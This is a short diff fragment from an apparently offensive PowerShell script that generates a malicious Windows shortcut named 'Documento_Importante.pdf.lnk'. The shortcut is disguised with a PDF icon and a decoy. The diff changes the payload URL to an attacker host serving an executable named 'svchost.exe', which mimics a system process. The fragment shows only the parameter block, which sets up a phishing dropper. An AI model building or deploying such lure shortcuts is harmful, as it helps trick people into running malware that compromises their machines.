@@ -18,7 +18,7 @@
 
 param(
     [string]$OutputFile = "Documento_Importante.pdf.lnk",
-    [string]$PayloadURL = "http://192.168.1.100:8000/agent.exe",
+    [string]$PayloadURL = "http://192.168.1.102/svchost.exe",
     [string]$DecoyPDF = "C:\Windows\System32\notepad.exe",  # Fallback si no hay PDF
     [string]$IconPath = "%SystemRoot%\System32\imageres.dll",  # DLL con iconos de Windows
     [int]$IconIndex = 102  # Índice del icono de PDF en imageres.dll
